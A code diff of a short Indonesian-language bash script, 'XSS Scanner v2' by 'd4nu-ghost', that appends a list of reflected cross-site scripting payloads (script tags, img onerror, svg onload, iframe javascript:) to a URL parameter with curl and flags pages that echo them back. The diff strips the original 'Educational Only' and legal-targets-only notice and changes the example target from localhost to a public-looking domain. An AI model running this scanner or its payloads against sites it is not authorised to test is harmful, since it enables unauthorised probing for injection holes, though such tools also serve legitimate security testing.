@@ -1,43 +1,37 @@
 #!/bin/bash
-# =====================================
-#  XSS Scanner Mini (Educational Only)
-#  Author : d4nu-ghost
-#  NOTE   : Gunakan hanya di lab / target legal (bug bounty, test sendiri)
-# =====================================
+# XSS Scanner v2
+# Author: d4nu-ghost
 
 if [ $# -ne 1 ]; then
-  echo "Usage: $0 <url-with-parameter>"
-  echo "Example: $0 'http://127.0.0.1/vuln.php?q='"
-  exit 1
+    echo "Usage: $0 <url>"
+    echo "Example: $0 'http://target.com/index.php?q=test'"
+    exit 1
 fi
 
-URL=$1
+url=$1
 
-# Koleksi payload dasar
-PAYLOADS=(
-  "<script>alert(d4nu-ghost)</script>"
-  "\"><script>alert(d4nu-ghost)</script>"
-  "'\"><img src=x onerror=alert(d4nu-ghost)>"
-  "<svg/onload=alert(d4nu-ghost)>"
-  "<body onload=alert(d4nu-ghost)>"
-  "';alert(1);//"
-  "<iframe src=javascript:alert(d4nu-ghost)>"
+# Payload list
+payloads=(
+    "'\"><script>alert(d4nu-ghost)</script>"
+    "\"><img src=x onerror=alert(d4nu-ghost)>"
+    "<svg onload=alert(d4nu-ghost)>"
+    "<iframe src=javascript:alert(d4nu-ghost)>"
+    "d4nu-ghost-xss"
 )
 
-echo "🎯 Target: $URL"
-echo "⚡ Mulai scanning XSS..."
-echo ""
+echo "🚀 Mulai scanning XSS di: $url"
+echo "==================================="
 
-for p in "${PAYLOADS[@]}"; do
-  echo "🔹 Testing payload: $p"
-  RESPONSE=$(curl -s -L "${URL}${p}")
+for payload in "${payloads[@]}"; do
+    echo "[*] Testing payload: $payload"
+    response=$(curl -s -L "$url$payload")
 
-  if echo "$RESPONSE" | grep -q "$p"; then
-    echo "✅ POTENSI XSS dengan payload: $p"
-  else
-    echo "❌ Tidak refleksi."
-  fi
-  echo "----------------------------------"
+    if echo "$response" | grep -q "$payload"; then
+        echo "✅ Refleksi ditemukan! --> POTENSI XSS 🎯"
+    else
+        echo "❌ Tidak refleksi"
+    fi
+    echo "-----------------------------------"
 done
 
-echo "🎉 Selesai scanning."
+echo "🔍 Selesai scanning."
